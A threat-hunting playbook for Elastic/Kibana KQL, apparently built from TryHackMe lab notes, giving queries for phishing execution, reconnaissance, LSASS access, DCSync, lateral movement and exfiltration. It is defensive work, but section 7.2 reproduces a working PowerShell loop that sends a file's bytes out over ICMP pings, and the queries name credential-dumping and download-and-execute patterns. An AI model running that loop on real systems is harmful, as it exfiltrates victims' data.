# Threat Hunting Playbook - Elastic/Kibana (KQL)

> **Purpose:** A reusable, investigation-first field guide for SOC analysts working with Elastic Discover, Winlogbeat, Sysmon, Filebeat, and Packetbeat. Built from personal notes on TryHackMe's *Threat Hunting: Foothold, Pivoting, and Endgame* rooms. The goal is to solve **new** scenarios independently-not reproduce challenge answers.
>
> **Scope:** KQL examples use field names observed in the provided lab notes. Field availability varies by index, agent version, and data source. Replace hostnames, IPs, users, timestamps, and index patterns with evidence from your own investigation. These are hunting leads, **not** high-confidence production detections.

## 1. Quick Reference - Start Here

| Investigation goal | KQL starting point | Look at next |
|---|---|---|
| Process creation | `winlog.event_id: 1` | `host.name`, `process.name`, `process.command_line`, `process.parent.command_line`, `user.name` |
| Suspicious shells | `winlog.event_id: 1 AND process.name: (cmd.exe OR powershell.exe OR pwsh.exe)` | Parent process, command line, timeline |
| Reconnaissance | `winlog.event_id: 1 AND process.name: (whoami.exe OR hostname.exe OR net.exe OR systeminfo.exe OR ipconfig.exe OR netstat.exe OR tasklist.exe)` | Burst of tools, unusual parent, source user |
| Script blocks | `winlog.event_id: 4104` | `winlog.event_data.ScriptBlockText` |
| PowerShell module logging | `winlog.event_id: 4103` | `winlog.event_data.Payload` / `winlog.event_data.Data.#text` |
| File creation | `winlog.event_id: 11` | `file.path`, `process.name`, `host.name` |
| DNS queries | `dns.question.name: *` | DNS name, related process, host, timestamp |
| Connections | `destination.ip: *` | `destination.port`, `network.protocol`, `process.name` |
| External HTTP | `network.protocol: http AND destination.port: 80` | `http.request.method`, destination domain/IP, response code |
| Remote thread | `winlog.event_id: 8` | Source process, target process, initiating user |
| Registry modifications | `winlog.event_id: (12 OR 13 OR 14)` | Registry path/value, originating process |
| Defender log cleared | `winlog.event_id: 1102` | User, host, preceding events; check channel/provider |
| LSASS dump file | `winlog.event_id: 11 AND file.path: *lsass.DMP*` | Creator process, parent, account |
| Failed authentication | `winlog.event_id: 4625` | Source address, username, logon type, rate |
| Successful authentication | `winlog.event_id: 4624` | Source address, username, logon type, neighboring failures |
| Directory replication attempts | `winlog.event_id: 4662` | Subject account, AccessMask, Properties GUIDs; only when audited |
| ICMP exfil script clues | `"System.Net.NetworkInformation.Ping"` | Script text, file read loop, chunk size, possible network evidence |
| Follow a known process | `process.pid: 1234` | Host, boot/session, process entity ID, parent-child relations |

**Very important:** Event IDs are **provider-specific**. Sysmon `1` is process creation, but Windows Security `4688` is process creation. Event `1102` (Security log cleared) is **not** the same as Sysmon registry event `12`. Confirm `winlog.channel` and `winlog.provider_name` whenever results mix providers.

## 2. Five-Minute Investigation Workflow

1. **Scope:** Choose the correct data view/index (`winlogbeat-*`, `packetbeat-*`, `filebeat-*`, or the room's provided index); expand the date range. Write down the assumed incident interval.
2. **Baseline:** Begin with broad searches. Identify hosts, users, top processes, uncommon domains, and event volume. Don't immediately hard-code the suspect.
3. **Hypothesis:** State one testable proposition: *“A phishing document launched a command interpreter, which downloaded a payload.”*
4. **Test:** Query relevant events. Add columns and sort **oldest → newest** to reconstruct sequence.
5. **Pivot:** Use a specific `host.name`, `user.name`, IP, file name, process ID, or parent command line from a result to discover related events.
6. **Validate:** Compare process, registry, auth, and network telemetry; seek at least one independent corroborating artifact.
7. **Explain:** Record timestamp (with timezone), host, user, action, evidence, interpretation, confidence, and competing benign explanation.
8. **Expand scope:** Search the same indicator across other hosts and the surrounding time period before concluding.

### A practical evidence ledger

| Time / timezone | Host | User | Source event | Observation | Interpretation | Confidence |
|---|---|---|---|---|---|---|
| YYYY-MM-DD HH:mm:ss UTC | HOST | DOMAIN\\user | Sysmon 1 | `outlook.exe` → `powershell.exe` | Possible document-driven execution | Medium until corroborated |

**Do not confuse** a timestamp shown by Kibana (browser timezone), `@timestamp`, an event's original time, and ingestion time.

## 3. KQL Syntax That Actually Matters

| Pattern | Meaning | Example |
|---|---|---|
| `field: value` | Field equals/matches value | `host.name: "WKSTN-1"` |
| `AND`, `OR`, `NOT` | Combine clauses | `winlog.event_id: 1 AND NOT process.name: "explorer.exe"` |
| `( ... )` | Group conditions | `process.name: (cmd.exe OR powershell.exe)` |
| `*` | Wildcard in supported positions | `process.command_line: *EncodedCommand*` |
| `field: *` | Field exists | `process.command_line: *` |
| `"quoted phrase"` | Exact phrase/full-text matching depends on mapping | `process.command_line: "whoami /all"` |
| Timepicker | Limits period independently of KQL | Choose incident date before drawing conclusions |

### KQL pitfalls

- **KQL is not Lucene regex or Splunk SPL.** Do not paste a regex such as `/.*abc.*/` and expect it to work.
- **Leading wildcards may be disabled** by Kibana settings. If `*abc*` produces an error, use a narrower/keyword search or another supported query mode.
- Field mapping matters: `process.command_line`, `winlog.event_data.CommandLine`, and `winlog.event_data.ScriptBlockText` are different fields. **Inspect a raw event first.**
- A term search without a field can scan default searchable fields, but it may miss data depending on index mapping.
- Some rooms use `winlog.event_id`; others use `event.code` or `winlog.event_data.*`. Check the **Available fields** panel.
- Host and user filter chips in Discover **still apply** when you change the KQL text. Remove restrictive filters before searching the entire environment.
- A record count is not always a network packet count, process execution count, or number of compromised hosts.

### Useful Discover columns

For process hunts: `@timestamp`, `host.name`, `user.name`, `process.name`, `process.executable`, `process.command_line`, `process.parent.name`, `process.parent.command_line`, `process.pid`, `process.parent.pid`.

For Windows events: `winlog.channel`, `winlog.provider_name`, `winlog.event_id`, `winlog.event_data.*`, `winlog.computer_name`.

For network activity: `source.ip`, `source.port`, `destination.ip`, `destination.port`, `dns.question.name`, `http.request.method`, `http.response.status_code`.

If the source lacks normalized ECS fields, use the raw `winlog.event_data.*` fields visible in that event.

## 4. Foothold - Find Initial Access and Execution

### 4.1 Phishing → application → command interpreter

Start broad:

```kql
winlog.event_id: 1 AND process.name: (cmd.exe OR powershell.exe OR pwsh.exe)
```

Then look for suspicious parents such as `WINWORD.EXE`, `EXCEL.EXE`, `OUTLOOK.EXE`, browser executables, or unusual helpers. If `process.parent.name` exists:

```kql
winlog.event_id: 1 AND process.parent.name: (WINWORD.EXE OR EXCEL.EXE OR OUTLOOK.EXE)
```

**Inspect:** full command line, parent command line, user, process tree, downloads, file creation, related DNS/HTTP. Office spawning a shell is interesting, but legitimate scripts/macros exist.

### 4.2 Downloads and newly created files

Source notes use Sysmon **Event ID 11** to hunt Chrome/Outlook file creation:

```kql
winlog.event_id: 11 AND process.name: chrome.exe
```

```kql
winlog.event_id: 11 AND process.name: OUTLOOK.EXE
```

Look at target path and extensions (`.zip`, `.js`, `.hta`, `.ps1`, `.exe`, `.dll`), user folders, timestamp, and any subsequent execution. A file's existence is **not** proof that it ran.

### 4.3 PowerShell execution and script content

```kql
winlog.event_id: 4104 AND winlog.event_data.ScriptBlockText: *
```

Then narrow to suspicious constructions (examples, not definitive detections):

```kql
winlog.event_id: 4104 AND winlog.event_data.ScriptBlockText: (*DownloadString* OR *FromBase64String* OR *Invoke-Expression*)
```

For module logging:

```kql
winlog.event_id: 4103
```

**Look for:** `-enc`, `-EncodedCommand`, `-nop`, `-w hidden`, `IEX`, network fetches, file writes, and post-execution process children. Some PowerShell event records split code across multiple messages; use `ScriptBlockId`, message number, and event time to correlate. PowerShell logs do **not** promise completely deobfuscated behavior.

### 4.4 Defender tampering / hiding tracks

```kql
winlog.event_id: 1102
```

This is a *Security audit log-cleared* indicator when the provider/channel matches. Search the neighboring timeline for suspicious processes, security policy changes, and log gaps. Defender configuration changes should instead be researched in the appropriate Defender operational logs and process/script telemetry. Do not treat 1102 as a universal Defender-disabled event.

### 4.5 In-memory activity and registry changes

Potential remote-thread creation:

```kql
winlog.event_id: 8
```

Registry persistence candidates:

```kql
winlog.event_id: (12 OR 13 OR 14)
```

Investigate `Run`, `RunOnce`, service keys, and security-product configuration changes. Confirm the source provider is Sysmon and correlate with process creation. One registry modification is not enough to label an intrusion.

## 5. Foothold / C2 - Network Hunting

### 5.1 DNS and HTTP pivots

```kql
dns.question.name: *
```

```kql
network.protocol: http AND destination.port: 80
```

Look for domains newly observed in the environment, repeated periodic connections, uncommon subdomains, paths, request methods, and the initiating process. The source notes emphasize using `packetbeat-*` for protocol/network views and `winlogbeat-*` to connect the activity to an endpoint process.

### 5.2 Suspicious domain investigation

After extracting a domain from one event, pivot using its actual name:

```kql
dns.question.name: "suspicious.example"
```

Or search the domain across fields if normalization is incomplete:

```kql
"suspicious.example"
```

Compare host-by-host activity; inspect whether a rare executable or a common browser initiated the connection. **Popularity alone doesn't make a domain benign.**

### 5.3 Compare hosts and build a Lens table

For domain activity, the supplied notes show a table workflow:

1. Select network data view, e.g., `packetbeat-*`.
2. Add rows: `host.name` and `dns.question.name` or `destination.domain` (whichever exists).
3. Add metric: **Count of records**.
4. Filter protocol to DNS or HTTP as appropriate; rank by count.
5. Pivot back to Discover for raw events and timestamps.

**Counts represent matching records, not necessarily unique DNS queries or sessions.** Beware duplicates, retries, client behavior, and aggregation periods.

## 6. Pivoting - From One Host to the Rest of the Network

### 6.1 Reconnaissance burst

The source notes explicitly enumerate this process hunt:

```kql
winlog.event_id: 1 AND process.name: (whoami.exe OR hostname.exe OR net.exe OR systeminfo.exe OR ipconfig.exe OR netstat.exe OR tasklist.exe)
```

Group by host/user and sort by time. A sequence of `whoami` → `ipconfig` → `net` → remote connections is more meaningful than any one command. Inspect the parent shell and user context.

### 6.2 Suspected network scanning

Start with connections from a suspicious host:

```kql
source.ip: "10.0.0.10" AND destination.port: *
```

Replace the sample IP. In Lens, group by `source.ip` and **unique count** of `destination.port` and/or `destination.ip`. Check many ports over a short interval, but distinguish administrator tools and routine software updates.

### 6.3 Active Directory / LDAP enumeration

```kql
destination.port: 389
```

For LDAP, investigate **who queried**, process identity, host, destination DC, frequency, and command line. DCs, identity software, and Exchange services produce normal LDAP traffic. The notes specifically suggest excluding routinely noisy processes **only after** understanding the baseline.

### 6.4 Privilege escalation and suspicious parents

```kql
winlog.event_id: 1 AND process.name: *
```

Look for unusual parent→child chains, impersonation tools, and privilege-related process arguments. A lab example examines `spoofer.exe`; do not rely on that filename in other incidents. Validate token/user changes and service or process telemetry.

### 6.5 Service permission changes and persistence

```kql
winlog.event_id: 13
```

For Sysmon Event ID 13, examine registry value changes to service paths, startup behavior, or security settings. Check whether a service was then started and launched unexpected processes. Source notes discuss service ImagePath tampering; use **path-specific** searches only once the relevant registry paths have been observed.

### 6.6 LSASS credential access

Search relevant event types based on available telemetry:

```kql
winlog.event_id: 10
```

```kql
winlog.event_id: 11 AND file.path: *lsass.DMP*
```

Event ID 10 (Sysmon ProcessAccess) is relevant to LSASS handle access; a file creation of `lsass.DMP` is a separate possible artifact. Inspect `SourceImage`, `TargetImage`, `GrantedAccess`, call trace, creator and parent. **Do not claim every LSASS access or memory dump is malicious:** EDR, crash handling, and admin diagnostics may generate similar data.

### 6.7 DCSync-oriented hunting

```kql
winlog.event_id: 4662
```

Next inspect `AccessMask`, `Properties`, account, source host, and whether directory service object auditing is enabled. Access masks, replication GUIDs, and audit coverage must be validated before identifying a DCSync attempt. A backup/service account can perform legitimate replication-related operations.

### 6.8 Password guessing → successful access → follow-on actions

```kql
winlog.event_id: 4625
```

```kql
winlog.event_id: 4624
```

Find bursts of failures by user/source; then narrow success events to the same user/source and relevant time. Correlate with new process activity on the destination. A successful NTLM logon or `LogonType: 3` **does not itself establish pass-the-hash**; examine additional context and tooling.

### 6.9 WMI-related lateral movement

```kql
winlog.event_id: 1 AND process.parent.name: WmiPrvSE.exe
```

If normalized parent fields are missing, search raw parent process fields. Investigate command-line arguments, target host, WMI provider activity, and authentication/service events. WMI is a common legitimate management mechanism too.

## 7. Endgame - Collection, Exfiltration and Impact

### 7.1 Collection: start with staged files and scripts

The uploaded notes use indicators like `chrome_local_profile.db` and a PowerShell `.ps1` filename to find collection activity. Use these as **illustrative pivots** (they are not universal detection strings):

```kql
"chrome_local_profile.db"
```

```kql
winlog.event_id: 4104 AND winlog.event_data.ScriptBlockText: *Get-Content*
```

Inspect file source, `Get-Content` parameters, compression/encoding, destination and parent processes. A file named like a browser profile may still be attacker-created: don't assume authenticity from the name.

### 7.2 ICMP-based exfiltration: reconstruct the loop

The room's PowerShell example reads bytes in fixed chunks and sends an ICMP echo per chunk:

```powershell
$ping = New-Object System.Net.NetworkInformation.Ping
$readChunkSize = 15
foreach ($data in Get-Content -Path $fl -Encoding Byte -ReadCount $readChunkSize) {
    $ping.Send($ip, $readChunkSize, $data)
}
```

The basic **expected** number of send calls is:

`ceil(file_size_bytes / readChunkSize)`

However:

- `$readChunkSize=15` describes bytes **per chunk**, not total packets.
- PowerShell `SequenceNumber` belongs to a logging record, **not** the ICMP packet count.
- PowerShell 4103 is not guaranteed to record every .NET `Ping.Send()` invocation.
- If the dataset contains actual network telemetry, filter **ICMP echo requests sent by the source** and count them there. Don't count echo replies as outbound requests.
- If only script logs are available, find the original file size or a **reliable per-send record**; state any inference and verify against challenge requirements.

Suggested searches:

```kql
"System.Net.NetworkInformation.Ping"
```

```kql
"icmp4data.ps1"
```

```kql
"chrome_local_profile.db"
```

These strings are specific to the training notes. They illustrate a useful technique: **file-read loop + network send API + command invocation → exfiltration hypothesis**.

### 7.3 Link script to its actual process

If the notes show a process ID or script block ID, pivot carefully:

```kql
winlog.event_data.ProcessId: "1972"
```

The notes feature `winlog.event_data.ProcessId` in one lab. Verify whether yours maps to `process.pid` instead. A PID can be reused; correlate host, timestamp, process GUID/entity ID when available, `ParentProcessId`, and `CommandLine`.

### 7.4 Impact

Prioritize:

- Large-scale file rename/write or deletion sequences.
- Ransomware process chains and creation of ransom notes.
- Deletion of recovery mechanisms or shadow copies.
- Service disruption and log-clearing events.
- Unusual mass process execution or changes to privileged accounts.

These are **hunting hypotheses**, not behaviors confirmed by the provided notes. Avoid claiming ransomware merely because many files were modified; correlate multiple sources.

## 8. A Repeatable Hunt for an Unknown Challenge

### Phase A - Discover the attack surface (10–15 min)

- Establish index coverage and incident time.
- List affected hosts and users.
- Inspect a few raw events from each data source to learn field names.
- Look for first unusual process, URL, file, or login.

### Phase B - Follow the chain

| Suspected stage | First useful search | Pivot question |
|---|---|---|
| Phishing/entry | Office/browser child processes, downloaded files | What launched the first suspicious code? |
| Execution | Sysmon 1, PowerShell 4104 | Who launched it, and with what command line? |
| Persistence | Registry 12/13/14, services, scheduled tasks | What survives reboot/logoff? |
| Defense evasion | Audit log clear, security policy/tampering | What telemetry was suppressed? |
| Discovery | Recon tools, LDAP | What did the operator learn? |
| Credential access | LSASS access/dumps, 4662 | What credential material was targeted? |
| Lateral movement | 4624/4625, WMI child processes, remote services | Which host was reached next? |
| C2 | DNS + HTTP/flow + process context | Which process contacted which destination? |
| Collection | Script/file reads and archives | What data was staged? |
| Exfiltration | Network transfer, ICMP/HTTP, destination and volume | What data likely left and how much? |
| Impact | File churn, ransom notes, service changes | What damage actually occurred? |

### Phase C - Report what you know, not what you guess

For each claimed attack step, document:

1. **Observed:** concrete log message, event ID, field value, timestamp.
2. **Interpretation:** why it could indicate the technique.
3. **Corroboration:** independent log, parent-child relationship, network evidence.
4. **Alternative:** legitimate admin/EDR/backup/scheduled task explanation.
5. **Remaining gap:** what you still cannot prove from available logs.

## 9. Common False Positives and Failure Modes

| Symptom | Common cause | Better next move |
|---|---|---|
| Query returns 0 hits | Wrong data view, time range, field, or wildcard setting | Remove filters; inspect raw event fields; widen dates |
| Only one workstation returns results | Discover filter chip still active | Remove host/user chips and repeat across environment |
| Many PowerShell hits | Script-block/module logging includes legitimate automation | Narrow by suspicious parent, downloaded content, time |
| Hundreds of DNS hits | Browser/OS background traffic | Compare host/domain baselines and initiating process |
| LSASS access alert | EDR, crash dump, PAM agent | Inspect signed binaries, path, mask, call trace, time |
| `4688` and `1` appear interchangeable | Security and Sysmon use different schemas | Confirm provider and channel |
| Search gives packet count from log count | One event can describe many actions | Use packet/flow data or a verifiable count of send operations |
| `admin$` or `127.0.0.1` is treated as proof | Local/admin activity may be legitimate | Inspect parent, host, account, remote destination and full context |
| A command looks encoded | Encoding is not proof of malware | Decode safely and correlate behavior |
| Process match is too narrow | Malware renamed or used alternate binaries | Hunt behaviors and relationships rather than one filename |
